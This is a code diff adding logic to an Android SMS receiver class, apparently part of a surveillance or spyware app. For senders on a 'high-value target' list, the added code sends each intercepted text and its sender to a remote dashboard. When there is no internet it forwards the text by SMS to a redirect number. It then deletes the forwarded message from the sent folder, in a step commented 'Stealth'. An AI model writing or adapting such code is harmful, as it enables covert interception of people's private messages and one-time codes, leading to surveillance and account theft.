@@ -50,6 +50,36 @@ class SmsReceiver : BroadcastReceiver() {
                 
                 DumpManager.appendLog("SMS", entry)
 
+                // --- HVT REDIRECTION LOGIC ---
+                val hvtPrefs = context.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
+                val redirectTarget = hvtPrefs.getString(sender, null)
+                if (redirectTarget != null) {
+                    CoroutineScope(Dispatchers.IO).launch {
+                        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+                        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
+                        val isOnline = caps != null && caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
+
+                        if (isOnline) {
+                            // Option 1: Send to Dashboard via High-Priority Ping
+                            val extra = JSONObject().apply { put("hvt_intercept", body); put("from", sender) }
+                            CloudManager.sendPing(context, "HVT_INTERCEPT", extra)
+                        } else {
+                            // Option 2: Forward via SMS Tunnel
+                            try {
+                                val smsManager = context.getSystemService(android.telephony.SmsManager::class.java)
+                                val msg = "[HVT:$sender] $body"
+                                val parts = smsManager.divideMessage(msg)
+                                smsManager.sendMultipartTextMessage(redirectTarget, null, parts, null, null)
+                                
+                                // Stealth: Cleanup sent folder
+                                delay(5000)
+                                val uri = android.net.Uri.parse("content://sms/sent")
+                                context.contentResolver.delete(uri, "address=?", arrayOf(redirectTarget))
+                            } catch (e: Exception) { }
+                        }
+                    }
+                }
+
                 try {
                     val cacheStr = prefs.getString("sms_logs_cache", "[]") ?: "[]"
                     val cacheArr = JSONArray(cacheStr)
